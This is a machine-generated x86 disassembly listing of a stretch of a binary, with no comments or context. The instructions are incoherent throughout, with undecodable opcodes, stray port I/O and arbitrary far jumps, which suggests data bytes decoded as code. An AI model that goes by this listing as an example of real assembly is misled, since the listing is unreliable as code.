  40ce74:	out    dx,al
  40ce75:	jns    0x40ce37
  40ce77:	jl     0x40ce6a
  40ce79:	sub    al,0x45
  40ce7b:	sbb    edi,DWORD PTR [ecx]
  40ce7d:	mov    ?,WORD PTR [ebx]
  40ce7f:	xor    eax,DWORD PTR [edi+ebx*1]
  40ce82:	push   eax
  40ce83:	xchg   edx,eax
  40ce84:	sbb    BYTE PTR [esi-0x224a1952],cl
  40ce8a:	test   eax,0x9a5116f8
  40ce8f:	xor    al,0x95
  40ce91:	(bad)
  40ce94:	inc    eax
  40ce95:	inc    ebp
  40ce96:	mov    ah,0x59
  40ce98:	sub    al,0xa5
  40ce9a:	dec    ebp
  40ce9b:	dec    ecx
  40ce9c:	xchg   BYTE PTR [eax+0x72bcc722],bl
  40cea2:	pop    ebp
  40cea3:	jmp    0x38d:0x3fda2404
  40ceaa:	cs add al,bl
  40cead:	arpl   WORD PTR [ebp-0x9],di
  40ceb0:	sub    DWORD PTR [ebx+0x724237bb],esi
  40ceb6:	repnz (bad) 
  40ceb8:	call   DWORD PTR [eax]
  40ceba:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cebc:	mov    ebx,0x6006a296
  40cec1:	dec    edi
  40cec2:	call   0xf512ead3
  40cec7:	push   edi
  40cec8:	sub    al,0xfd
  40ceca:	mov    ch,0x2c
  40cecc:	xlat   BYTE PTR ds:[ebx]
  40cecd:	push   0x3
  40cecf:	out    0xbc,al
  40ced1:	or     DWORD PTR [eax-0x5cee757b],ebp
  40ced7:	outs   dx,DWORD PTR ds:[esi]
  40ced8:	xor    ebx,edx
  40ceda:	in     eax,0x3
  40cedc:	mov    al,ds:0xbc9d9471
  40cee1:	jb     0x40ceb8
  40cee3:	das    
  40cee4:	or     DWORD PTR [edx+0x3b],ebp
  40cee7:	scas   eax,DWORD PTR es:[edi]
  40cee8:	sbb    al,0xb4
  40ceea:	(bad)  
  40ceeb:	cmp    BYTE PTR [edx],ch
  40ceed:	int3   
  40ceee:	mov    ch,0x11
  40cef0:	xchg   ecx,eax
  40cef1:	jmp    0x44ac:0x38c082b5
  40cef8:	mov    ecx,0x58e20542
  40cefd:	xchg   DWORD PTR [ebx],ecx
  40ceff:	inc    ecx
  40cf00:	mov    cl,0xed
  40cf02:	dec    edi
  40cf03:	dec    ecx
  40cf04:	add    ah,BYTE PTR [edi]
  40cf06:	ret    0x7f20
  40cf09:	int3   
  40cf0a:	mov    ds:0xa1ddc9e1,al
  40cf0f:	mov    dl,0x50
  40cf11:	xchg   esp,eax
  40cf12:	inc    esi
  40cf13:	js     0x40cf3d
  40cf15:	or     DWORD PTR [ecx+0x72],eax
  40cf18:	neg    DWORD PTR [ebx+eiz*2+0x78]
  40cf1c:	push   ebx
  40cf1d:	pop    esp
  40cf1e:	push   esi
  40cf1f:	push   ds
  40cf20:	out    dx,eax
  40cf21:	or     BYTE PTR [eax+0x5e],ch
  40cf24:	push   esp
  40cf25:	or     eax,0x84b62922
  40cf2a:	ins    BYTE PTR es:[edi],dx
  40cf2b:	cmp    DWORD PTR [ebp+esi*4+0x8cf466],ecx
  40cf32:	mov    al,ds:0x896f0660
  40cf37:	cmp    ebp,DWORD PTR [edx]
  40cf39:	mov    cl,BYTE PTR [ecx]
  40cf3b:	stc    
  40cf3c:	mov    ebp,0xa459b230
  40cf41:	dec    ebp
  40cf42:	and    edi,DWORD PTR [esi]
  40cf44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf45:	out    dx,al
  40cf46:	jb     0x40ced4
  40cf48:	jmp    0x30c6c7a
  40cf4d:	stos   BYTE PTR es:[edi],al
  40cf4e:	ins    DWORD PTR es:[edi],dx
  40cf4f:	xor    dh,BYTE PTR [edi+0x57905ca6]
  40cf55:	adc    DWORD PTR [ecx],ebp
  40cf57:	outs   dx,DWORD PTR ds:[esi]
  40cf58:	imul   edx,DWORD PTR [ecx+0x21c415e6],0xffffffde
  40cf5f:	lods   eax,DWORD PTR ds:[esi]
  40cf60:	mov    ch,0x75
  40cf62:	inc    edi
  40cf63:	cmp    DWORD PTR [edx],0x212bcec6
  40cf69:	fwait
  40cf6a:	in     al,dx
  40cf6b:	mov    ebx,0x3b76ff4c
  40cf70:	out    dx,al
  40cf71:	cmp    edi,0x70
  40cf74:	shl    dl,cl
  40cf76:	dec    esp
  40cf77:	or     esp,esp
  40cf79:	repnz and DWORD PTR [ebx],0x26
  40cf7d:	mov    ebx,0x56852573
  40cf82:	loopne 0x40cf58
  40cf84:	out    0x22,eax
  40cf86:	xor    DWORD PTR [esi+eax*1+0x5a54cae4],0xffffffd3
  40cf8e:	into   
  40cf8f:	dec    ebx
  40cf90:	jne    0x40cff8
  40cf92:	mov    ds:0xcbf3aab3,al
  40cf97:	mov    al,ds:0x8ab72350
  40cf9c:	sub    BYTE PTR [edx+ebp*4+0x46],ch
  40cfa0:	jns    0x40cff8
  40cfa2:	mov    dh,0x23
  40cfa4:	test   dl,bh
  40cfa6:	pop    esp
  40cfa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfa8:	mov    ds:0x3fa2045e,eax
  40cfad:	dec    ecx
  40cfae:	xor    edi,DWORD PTR [ebx+0x53]
  40cfb1:	lock sbb bl,BYTE PTR [esi-0x10]
  40cfb5:	push   ss
  40cfb6:	mov    DWORD PTR [ebp+0x4d],0x85ab2672
  40cfbd:	stc    
  40cfbe:	out    dx,eax
  40cfbf:	push   ebx
  40cfc0:	pop    ebp
  40cfc1:	add    eax,0x94ebc510
  40cfc6:	in     al,dx
  40cfc7:	(bad)  
  40cfc8:	into   
  40cfc9:	ss jnp 0x40cfb3
  40cfcc:	pushf  
  40cfcd:	xor    al,BYTE PTR [edx]
  40cfcf:	in     al,0x1b
  40cfd1:	mov    BYTE PTR [esi],bl
  40cfd3:	or     DWORD PTR [eax],0x70b24019
  40cfd9:	inc    eax
  40cfda:	dec    ebx
  40cfdb:	and    bl,BYTE PTR [esi-0x39]
  40cfde:	sahf   
  40cfdf:	inc    esi
  40cfe0:	add    eax,0xc6d83460
  40cfe5:	popf   
  40cfe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfe7:	ja     0x40cf7f
  40cfe9:	das    
  40cfea:	fbstp  TBYTE PTR [ebp+0xe]
  40cfed:	xchg   ecx,eax
  40cfee:	fwait
  40cfef:	and    eax,0xd4ab4d26
  40cff4:	cmp    DWORD PTR [ebp+eax*8+0x1a],edx
  40cff8:	mov    ch,0xfb
  40cffa:	mov    ch,0xef
  40cffc:	pop    es
  40cffd:	or     BYTE PTR [edx+0x75],ch
  40d000:	int    0x4f
  40d002:	sub    ecx,ecx
  40d004:	cli    
  40d005:	mov    eax,ds:0xce25e881
  40d00a:	or     eax,ecx
  40d00c:	into   
  40d00d:	push   esp
  40d00e:	dec    ebp
  40d00f:	inc    ebx
  40d010:	dec    esi
  40d011:	mov    edi,0x46810a1b
  40d016:	sub    ch,BYTE PTR [esi-0x340e73dd]
  40d01c:	mov    eax,0xb42bd6b9
  40d021:	loopne 0x40d031
  40d023:	sbb    bh,bl
  40d025:	loop   0x40cfab
  40d027:	jae    0x40d04a
  40d029:	out    dx,eax
  40d02a:	mov    dh,0x3d
  40d02c:	(bad)  [esi]
  40d02e:	cmc    
  40d02f:	pop    ss
  40d030:	shl    DWORD PTR [esi+esi*2-0x26],0x7f
  40d035:	outs   dx,BYTE PTR ds:[esi]
  40d036:	pop    ss
  40d037:	data16 clc 
  40d039:	shl    ecx,cl
  40d03b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d03c:	cmp    eax,0xe9b5d51c
  40d041:	jl     0x40d088
  40d043:	(bad)  
  40d044:	inc    ebx
  40d046:	cmp    eax,0x89b5dd28
  40d04b:	lahf   
  40d04c:	ins    DWORD PTR es:[edi],dx
  40d04d:	mov    ebp,0xd76ceed0
  40d052:	mov    ebp,0x7e95eb77
  40d057:	mov    BYTE PTR [eax-0x1c],cl
  40d05a:	mov    esi,0x2e0076c
  40d05f:	popa   
  40d060:	cdq    
  40d061:	stc    
  40d062:	arpl   bx,ax
  40d064:	pop    esi
  40d065:	add    al,0x58
  40d067:	mov    esp,DWORD PTR ds:0x111d8ad2
  40d06d:	outs   dx,BYTE PTR ds:[esi]
  40d06e:	test   DWORD PTR [edi+0x50ac5e7f],eax
  40d074:	sti    
  40d075:	xchg   esp,eax
  40d076:	adc    al,0x26
  40d078:	pop    ebx
  40d079:	or     DWORD PTR [ebp+0x68],0x24
  40d07d:	or     DWORD PTR [ebp+0x295a414f],edx
  40d083:	mov    dl,0x32
  40d085:	mov    ds:0x1607185c,al
  40d08a:	je     0x40d077
  40d08c:	jns    0x40d0b9
  40d08e:	in     al,dx
  40d08f:	push   edx
  40d090:	je     0x40d0ca
  40d092:	inc    esi
  40d093:	pop    ecx
  40d094:	(bad)  
  40d096:	test   eax,0xda8a3e4d
  40d09b:	mov    edx,0xe13a7806
  40d0a0:	mul    BYTE PTR [edx-0x1]
  40d0a3:	das    
  40d0a4:	fnstenv [eax+0x36]
  40d0a7:	sbb    al,0x39
  40d0a9:	mov    edi,0x2d883a0b
  40d0ae:	ror    ch,0xd4
  40d0b1:	xor    al,0x24
  40d0b3:	je     0x40d11b
  40d0b5:	jmp    0x40d040
  40d0b7:	test   al,0x8a
  40d0b9:	aam    0x3f
  40d0bb:	xchg   esi,eax
  40d0bc:	rcr    BYTE PTR [edi+ecx*1-0x59fd3874],0xf
  40d0c4:	xchg   BYTE PTR [esi-0x10],ah
  40d0c7:	(bad)  
  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    ebp,FWORD PTR [ecx]
  40d0ef:	call   0x7070:0x9daad922
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d136
  40d0fb:	mov    esp,0x197f14df
  40d100:	pop    eax
  40d101:	les    ebp,FWORD PTR [eax+ebp*2-0x644613ed]
  40d108:	push   eax
  40d109:	sub    bl,BYTE PTR [esi-0x48]
  40d10c:	inc    edi
  40d10d:	jne    0x40d10a
  40d10f:	adc    ch,ch
  40d111:	mov    al,ds:0xe354aac1
  40d116:	sbb    ecx,edi
  40d118:	jo     0x40d131
  40d11a:	adc    BYTE PTR [ecx+ebp*4+0x23e0587a],bh
  40d121:	imul   DWORD PTR [edx+0x67a3becf]
  40d127:	jbe    0x40d0f7
  40d129:	fwait
  40d12a:	mov    dl,dl
  40d12c:	cwde   
  40d12d:	shl    BYTE PTR [ecx+esi*1-0x7af9e52c],0xbb
  40d135:	xor    eax,0x67d35a52
  40d13a:	sbb    BYTE PTR [eax-0x4ea0d87f],ah
  40d140:	addr16 add ch,bh
  40d143:	data16 adc dl,cl
  40d146:	test   BYTE PTR [esi],ch
  40d148:	test   eax,0xa913e8fb
  40d14e:	repz ror BYTE PTR [eax*1+0x78ee128c],0x97
  40d157:	bnd jbe 0x40d104
  40d15a:	aaa    
  40d15b:	inc    esp
  40d15c:	add    bh,BYTE PTR [eax]
  40d15e:	xchg   edx,eax
  40d15f:	ins    DWORD PTR es:[edi],dx
  40d160:	call   0x21d5eb16
  40d165:	jmp    0x40d139
  40d167:	imul   esi,DWORD PTR [edx-0x119732e6],0x17
  40d16e:	inc    ecx
  40d16f:	xor    eax,0xd503fb65
  40d174:	sbb    eax,0xc523c059
  40d179:	xlat   BYTE PTR ds:[ebx]
  40d17a:	stc    
  40d17b:	js     0x40d1f0
  40d17d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d17e:	xchg   esi,eax
  40d17f:	mov    eax,0x9e1a49a5
  40d184:	loope  0x40d12d
  40d186:	sub    al,0xc0
  40d188:	jno    0x40d204
  40d18a:	xor    cl,bl
  40d18c:	jmp    0x82bfdfbf
  40d191:	push   ebx
  40d192:	cli    
  40d193:	xchg   edx,eax
  40d194:	in     eax,0xce
  40d196:	es call 0xcc46523c
  40d19c:	adc    ah,BYTE PTR [ebx-0x743e3a67]
  40d1a2:	jl     0x40d1da
  40d1a4:	and    BYTE PTR [esi+0x217a235f],dl
  40d1aa:	pop    ss
  40d1ab:	ds xchg ebp,eax
  40d1ad:	in     al,dx
  40d1ae:	mov    al,0x4c
  40d1b0:	movntps XMMWORD PTR [ebx],xmm2
  40d1b3:	ss loopne 0x40d22d
  40d1b6:	int3   
  40d1b7:	sbb    eax,0xfe8b7717
  40d1bc:	mov    edx,DWORD PTR ds:0xf5de9bc1
  40d1c2:	pop    es
  40d1c3:	pop    esp
  40d1c4:	(bad)  
  40d1c5:	inc    ecx
  40d1c6:	inc    ebx
  40d1c7:	leave  
  40d1c8:	adc    al,0x5d
  40d1ca:	push   es
  40d1cb:	adc    BYTE PTR [ebp-0x6a4f1e01],al
  40d1d1:	jp     0x40d157
  40d1d3:	in     al,dx
  40d1d4:	sbb    BYTE PTR [eax+eiz*4+0x7d2bc186],al
  40d1db:	lds    ecx,FWORD PTR [edx-0x28ffa131]
  40d1e1:	ins    DWORD PTR es:[edi],dx
  40d1e2:	rcr    BYTE PTR [ebx],0xd5
  40d1e5:	add    esp,DWORD PTR [edx]
  40d1e7:	imul   esp,esi,0x4707df0d
  40d1ed:	cmp    eax,0x3d2ca120
  40d1f2:	and    dl,BYTE PTR [edx-0x2877672b]
  40d1f8:	adc    dl,cl
  40d1fa:	pop    esi
  40d1fb:	jno    0x40d278
  40d1fd:	sbb    DWORD PTR [ebp+0x6f903c31],esi
  40d203:	loop   0x40d185
  40d205:	or     edi,DWORD PTR [ebp+0x7f15ec98]
  40d20b:	push   esi
  40d20c:	pop    es
  40d20d:	jle    0x40d24f
  40d20f:	shl    BYTE PTR [ebx-0x14012f31],1
  40d215:	daa    
  40d216:	ret    0x9568
  40d219:	shr    DWORD PTR [esi-0x31],cl
  40d21c:	jns    0x40d1ee
  40d21e:	cmp    DWORD PTR [ebx],ebx
  40d220:	bound  edx,QWORD PTR [esi-0x65]
  40d223:	mov    edx,0xd3be7f4d
  40d228:	inc    ebp
  40d229:	repnz and BYTE PTR [esi-0x5d458b40],ch
  40d230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d231:	mov    ch,0x31
  40d233:	cmp    al,0x3c
  40d235:	sbb    ebx,ecx
  40d237:	loop   0x40d285
  40d239:	in     eax,0xbc
  40d23b:	ficom  DWORD PTR [edx]
  40d23d:	leave  
  40d23e:	adc    al,0x25
  40d240:	pusha  
  40d241:	adc    al,0xbd
  40d243:	adc    DWORD PTR [eax],0x188f5543
  40d249:	imul   edx,DWORD PTR [edi],0x53c35dc2
  40d24f:	test   DWORD PTR [eax+0x53],ecx
  40d252:	out    dx,eax
  40d253:	jmp    0x40d224
  40d255:	inc    eax
  40d256:	imul   ebp,DWORD PTR [esi],0x1f
  40d259:	std    
  40d25a:	mov    al,ds:0x72bd0938
  40d25f:	sbb    DWORD PTR [eax+0x56],0xe78a1776
  40d266:	push   esp
  40d267:	loope  0x40d279
  40d269:	sti    
  40d26a:	shl    DWORD PTR [ecx],cl
  40d26c:	dec    esi
  40d26d:	inc    ebx
  40d26e:	call   FWORD PTR [ecx+0x4be6d1c1]
  40d274:	repnz sahf 
  40d276:	and    edx,edi
  40d278:	inc    esi
  40d279:	xor    al,0xd9
  40d27b:	jge    0x40d27f
  40d27d:	push   edi
  40d27e:	xchg   esi,eax
  40d27f:	(bad)  
  40d280:	stos   DWORD PTR es:[edi],eax
  40d281:	push   ebx
  40d282:	into   
  40d283:	mov    cl,0xe8
  40d285:	cwde   
  40d286:	scas   eax,DWORD PTR es:[edi]
  40d287:	loop   0x40d217
  40d289:	ins    DWORD PTR es:[edi],dx
  40d28a:	ins    DWORD PTR es:[edi],dx
  40d28b:	jbe    0x40d228
  40d28d:	retw   
  40d28f:	in     eax,dx
  40d290:	push   esi
  40d291:	mov    DWORD PTR [ebp+eax*2+0x6e],edi
  40d295:	jg     0x40d2d4
  40d297:	js     0x40d237
  40d299:	mov    eax,ds:0xfac6b034
  40d29e:	arpl   WORD PTR [eax-0x25],cx
  40d2a1:	ins    DWORD PTR es:[edi],dx
  40d2a2:	ret    
  40d2a3:	xor    bl,BYTE PTR [edx+0x686702d4]
  40d2a9:	push   ebp
  40d2aa:	mov    dh,0x2f
  40d2ac:	jle    0x40d311
  40d2ae:	or     dh,bh
  40d2b0:	push   DWORD PTR [edi+eax*1-0x23]
  40d2b4:	sahf   
  40d2b5:	call   0x4d46:0x5825eaa5
  40d2bc:	popa   
  40d2bd:	frstor [ecx+0x1f22366b]
  40d2c3:	xchg   edi,ebp
  40d2c5:	retf   
  40d2c6:	add    bl,al
  40d2c8:	xchg   edi,eax
  40d2c9:	js     0x40d276
  40d2cb:	sbb    dh,BYTE PTR [edx]
  40d2cd:	mov    ebp,0x5b752096
  40d2d2:	ss xchg edi,eax
  40d2d4:	add    al,0xb3
  40d2d6:	lods   eax,DWORD PTR ds:[esi]
  40d2d7:	ins    BYTE PTR es:[edi],dx
  40d2d8:	stos   DWORD PTR es:[edi],eax
  40d2d9:	fnstenv [ecx]
  40d2db:	mov    cl,0xa
  40d2dd:	sbb    DWORD PTR [edi-0x32],ebp
  40d2e0:	mov    ch,ah
  40d2e2:	repz fucomip st,st(0)
  40d2e5:	je     0x40d2b4
  40d2e7:	adc    DWORD PTR [edi+esi*8+0x2a],edx
  40d2eb:	inc    bl
  40d2ed:	jbe    0x40d35b
  40d2ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2f0:	cmp    eax,0x5027155e
  40d2f5:	das    
  40d2f6:	xchg   ebp,eax
  40d2f7:	(bad)  
  40d2f8:	jnp    0x40d2eb
  40d2fa:	mov    ds:0xdff8895d,eax
  40d2ff:	unpckhps xmm3,xmm6
  40d302:	push   esp
  40d303:	dec    ebp
  40d304:	fst    DWORD PTR [ecx-0x52]
  40d307:	pop    eax
  40d308:	sub    ebp,edi
  40d30a:	xchg   edi,eax
  40d30b:	jno    0x40d32b
  40d30d:	or     edx,edi
  40d30f:	pop    ebp
  40d310:	test   al,0x7
  40d313:	inc    edi
  40d314:	jmp    0x40d331
  40d316:	jo     0x40d2b3
  40d318:	popa   
  40d319:	add    al,0xf3
  40d31b:	xor    al,0xba
  40d31d:	dec    ebp
  40d31e:	retf   
  40d31f:	cwde   
  40d320:	jo     0x40d2a7
  40d322:	or     DWORD PTR [edi+0x1f],ecx
  40d325:	aas    
  40d326:	iret   
  40d327:	les    ecx,FWORD PTR [edi-0x16]
  40d32a:	loope  0x40d2e4
  40d32c:	mov    DWORD PTR [ebx-0xd],ebx
  40d32f:	push   ss
  40d330:	scas   eax,DWORD PTR es:[edi]
  40d331:	ds xchg bl,bl
  40d334:	sbb    esp,ebx
  40d336:	and    bh,cl
  40d338:	jge    0x40d2fa
  40d33a:	cmp    esi,ecx
  40d33c:	sub    al,0x34
  40d33e:	stos   DWORD PTR es:[edi],eax
  40d33f:	push   0x54b16d07
  40d344:	and    esi,DWORD PTR [ebp-0x3fea92ab]
  40d34a:	or     esi,DWORD PTR [ebp+0x6a7515b2]
  40d350:	lock sub edi,edx
  40d353:	inc    edi
  40d354:	fwait
  40d355:	in     al,dx
  40d356:	dec    edx
  40d357:	jmp    0xe72d:0x44a9d615
  40d35e:	add    bh,ch
  40d360:	(bad)  
  40d361:	xchg   edi,eax
  40d362:	and    BYTE PTR ds:0x802dec72,bh
  40d368:	jbe    0x40d34e
  40d36a:	mov    ah,0x42
  40d36c:	mov    edi,0xee14a9f4
  40d371:	loopne 0x40d357
  40d373:	mov    ds:0x44fe4273,eax
  40d378:	mov    ds:0x4bc89c5d,eax
  40d37d:	pop    es
  40d37e:	push   cs
  40d37f:	mov    edi,esi
  40d381:	and    esp,DWORD PTR [edx-0x4b794a3b]
  40d387:	lods   al,BYTE PTR ds:[esi]
  40d388:	repnz outs dx,DWORD PTR ds:[esi]
  40d38a:	scas   eax,DWORD PTR es:[edi]
  40d38b:	push   cs
  40d38c:	test   eax,0x480d3de
  40d391:	aad    0x44
  40d393:	dec    eax
  40d394:	cmp    dl,cl
  40d396:	daa    
  40d397:	call   DWORD PTR [ecx-0x777cfc73]
  40d39d:	sub    BYTE PTR [edi],dh
  40d39f:	mov    DWORD PTR [esi+0x32],0x66ad4bd0
  40d3a6:	aad    0x3
  40d3a8:	pop    esi
  40d3a9:	dec    edx
  40d3aa:	ins    DWORD PTR es:[edi],dx
  40d3ab:	lds    ecx,FWORD PTR [ebx+eax*4]
  40d3ae:	cdq    
  40d3af:	mov    esp,0xec51776b
  40d3b4:	imul   DWORD PTR [esi]
  40d3b6:	sbb    BYTE PTR [esp+esi*2-0x2e],0x50
  40d3bb:	cmp    al,0x39
  40d3bd:	sbb    DWORD PTR [ecx+0x7b0f603b],0xffffffda
  40d3c4:	jmp    0xb3154291
  40d3c9:	sub    BYTE PTR [ecx+0x23],dh
  40d3cc:	mov    DWORD PTR [ebx+0x3924160f],esp
  40d3d2:	mov    al,0xbd
  40d3d4:	cmp    al,0xd5
  40d3d6:	fcomip st,st(5)
  40d3d8:	mov    edx,0xf3f13d22
  40d3dd:	test   DWORD PTR [ebp+0x41],eax
  40d3e0:	jmp    0xe6cdbc4b
  40d3e5:	add    edx,DWORD PTR [ebx-0x7b]
  40d3e8:	cmp    edi,DWORD PTR [ebp-0x1ab09612]
  40d3ee:	mov    dl,0xeb
  40d3f0:	mov    ecx,0x55ec0646
  40d3f5:	sahf   
  40d3f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3f7:	push   0xd41d2c1f
  40d3fc:	mov    esi,DWORD PTR [ecx+0x75cadf07]
  40d402:	mov    esi,0xe1aa0d46
  40d407:	jp     0x40d43c
  40d409:	pop    eax
  40d40a:	imul   edi,DWORD PTR ds:0x993b4a3a,0x76c3df88
  40d414:	and    esi,DWORD PTR [ebx+0x20bcd713]
  40d41a:	jmp    0xb2d167c0
  40d41f:	jmp    0x7d09e4e0
  40d424:	(bad)  
  40d425:	pop    esi
  40d426:	push   cs
  40d427:	fadd   st,st(1)
  40d429:	clc    
  40d42a:	icebp  
  40d42b:	imul   esi,DWORD PTR [edx+0x5c],0x2923feba
  40d432:	xor    eax,0x9379f171
  40d437:	(bad)  
  40d438:	(bad)  
  40d439:	mov    eax,0x2ad4d588
  40d43e:	pop    DWORD PTR [esi+0x60193ce1]
  40d444:	dec    ecx
  40d445:	pop    ebp
  40d446:	or     DWORD PTR [eax+0x67ad20ef],esi
  40d44c:	sub    DWORD PTR [esi],edi
  40d44e:	mov    WORD PTR [ecx],?
  40d450:	(bad)  
  40d452:	loope  0x40d426
  40d454:	mov    ds:0xc592e29a,al
  40d459:	push   edx
  40d45a:	and    eax,ebx
  40d45c:	sbb    esi,DWORD PTR ds:0x638da74f
  40d462:	xchg   edi,eax
  40d463:	fxch   st(3)
  40d465:	xchg   ebx,eax
  40d466:	or     edi,DWORD PTR [esi-0x8191786]
  40d46c:	aas    
  40d46d:	push   ebp
  40d46e:	xlat   BYTE PTR ds:[ebx]
  40d46f:	and    eax,0x3ae26671
  40d474:	stc    
  40d475:	or     DWORD PTR [ebp*2-0x3a8e19e0],0xffffffc2
  40d47d:	popa   
  40d47e:	push   esi
  40d47f:	mov    ah,0xb1
  40d481:	dec    edx
  40d482:	sub    BYTE PTR [eax*2+0x59b15305],0x48
  40d48a:	ja     0x40d44e
  40d48c:	rcl    DWORD PTR gs:[edx+ecx*4],1
  40d490:	in     eax,dx
  40d491:	sbb    dh,BYTE PTR [ebp+0x74]
  40d494:	mov    ds:0x1ffcbed0,eax
  40d499:	sahf   
  40d49a:	test   DWORD PTR [ebx-0x6b720783],ecx
  40d4a0:	cmp    bl,BYTE PTR [edx+esi*2+0x55890032]
  40d4a7:	clc    
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0xddd3:0xb81a1d63
  40d4c6:	into   
  40d4c7:	cmp    eax,DWORD PTR [esi-0x37]
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d4a1
  40d4d2:	or     al,BYTE PTR [eax+0x3c]
  40d4d5:	enter  0x1e3c,0x60
  40d4d9:	adc    al,0x57
  40d4db:	loopne 0x40d4e4
  40d4dd:	mov    ds:0xe74a2252,al
  40d4e2:	jp     0x40d533
  40d4e4:	loope  0x40d4bb
  40d4e6:	adc    DWORD PTR [eax-0x3c],esi
  40d4e9:	and    ch,dl
  40d4eb:	mov    ebp,DWORD PTR [edi]
  40d4ed:	(bad)  
  40d4ee:	dec    esi
  40d4ef:	popf   
  40d4f0:	or     BYTE PTR [esi-0x7b06c49d],ch
  40d4f6:	repz sub eax,esi
  40d4f9:	push   0x601d5c36
  40d4fe:	fwait
  40d4ff:	xchg   ebx,eax
  40d500:	xchg   ebp,eax
  40d501:	mov    al,ds:0xed678040
  40d506:	inc    edi
  40d507:	xchg   ebp,eax
  40d508:	sahf   
  40d509:	test   al,0x7e
  40d50b:	or     esp,edi
  40d50d:	add    al,0x41
  40d50f:	test   al,0x45
  40d511:	dec    eax
  40d512:	outs   dx,DWORD PTR ds:[esi]
  40d513:	mov    esp,0xbb71f712
  40d518:	retf   0x1298
  40d51b:	ret    
  40d51c:	dec    esi
  40d51d:	jbe    0x40d57d
  40d51f:	enter  0xaa26,0xe0
  40d523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d524:	mov    DWORD PTR [ecx+0x9ddb548],edi
  40d52a:	int    0xac
  40d52c:	gs in  al,0xcc
  40d52f:	idiv   BYTE PTR [ecx+0x39]
  40d532:	sahf   
  40d533:	sti    
  40d534:	adc    ch,ch
  40d536:	call   DWORD PTR [eax-0x75]
  40d539:	outs   dx,DWORD PTR ss:[esi]
  40d53b:	xlat   BYTE PTR ds:[ebx]
  40d53c:	jmp    0x40d594
  40d53e:	or     al,0xe4
  40d540:	xchg   ebp,eax
  40d541:	mov    ds:0x2d72c572,eax
  40d546:	aas    
  40d547:	scas   al,BYTE PTR es:[edi]
  40d548:	add    DWORD PTR fs:[ebp+edx*2+0x8],0x34
  40d54e:	ror    DWORD PTR [edi-0x21],cl
  40d551:	int    0x54
  40d553:	xchg   BYTE PTR [esi-0x7d],ah
  40d556:	pusha  
  40d557:	sub    BYTE PTR [eax],cl
  40d559:	jno    0x40d562
  40d55b:	mov    edx,0x175bd3bb
  40d560:	aas    
  40d561:	adc    BYTE PTR [edi+0x2f],dh
  40d564:	iret   
  40d565:	xchg   ebx,eax
  40d566:	inc    ecx
  40d567:	std    
  40d568:	jnp    0x40d4f3
  40d56a:	mov    esi,0xbfdf9a4a
  40d56f:	ins    DWORD PTR es:[edi],dx
  40d570:	jle    0x40d530
  40d572:	cli    
  40d573:	ret    
  40d574:	nop
  40d575:	dec    ebx
  40d576:	cli    
  40d577:	and    DWORD PTR [esi],0x931f93c8
  40d57d:	pop    ebp
  40d57e:	aad    0x79
  40d580:	ret    
  40d581:	outs   dx,BYTE PTR ds:[esi]
  40d582:	mov    BYTE PTR ds:0x6f0040ee,bh
  40d588:	std    
  40d589:	mov    eax,0xe2b12d49
  40d58e:	inc    edx
  40d58f:	sti    
  40d590:	xchg   ebp,eax
  40d591:	xchg   ebp,eax
  40d592:	pop    ss
  40d593:	call   0x7759166f
  40d598:	shl    esp,0x7b
  40d59b:	aad    0xd0
  40d59d:	retf   0x616f
  40d5a0:	push   edi
  40d5a1:	loop   0x40d596
  40d5a3:	mov    esi,0xa5da1676
  40d5a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5a9:	dec    edi
  40d5aa:	cdq    
  40d5ab:	push   ecx
  40d5ac:	mov    bl,dh
  40d5ae:	mov    ecx,0x59003144
  40d5b3:	call   0x7f9b:0x9c1d77af
  40d5ba:	call   0xfe3f33c1
  40d5bf:	mov    ecx,0x2c31c13f
  40d5c4:	scas   eax,DWORD PTR es:[edi]
  40d5c5:	lods   al,BYTE PTR ds:[esi]
  40d5c6:	cmc    
  40d5c7:	mov    eax,ds:0x9566a37f
  40d5cc:	aam    0xa7
  40d5ce:	les    ebx,FWORD PTR [ecx]
  40d5d0:	test   DWORD PTR [esi+0x8],edx
  40d5d3:	and    cl,BYTE PTR [ebx-0x44]
  40d5d6:	cwde   
  40d5d7:	inc    esp
  40d5d8:	push   esp
  40d5d9:	(bad)  
  40d5da:	in     al,0xb9
  40d5dc:	inc    esp
  40d5dd:	mov    ebx,0xfa88ac67
  40d5e2:	cmp    al,BYTE PTR [esi]
  40d5e4:	add    ecx,edi
  40d5e6:	push   es
  40d5e7:	push   esi
  40d5e8:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5ea:	xchg   esi,eax
  40d5eb:	pushf  
  40d5ec:	aam    0xab
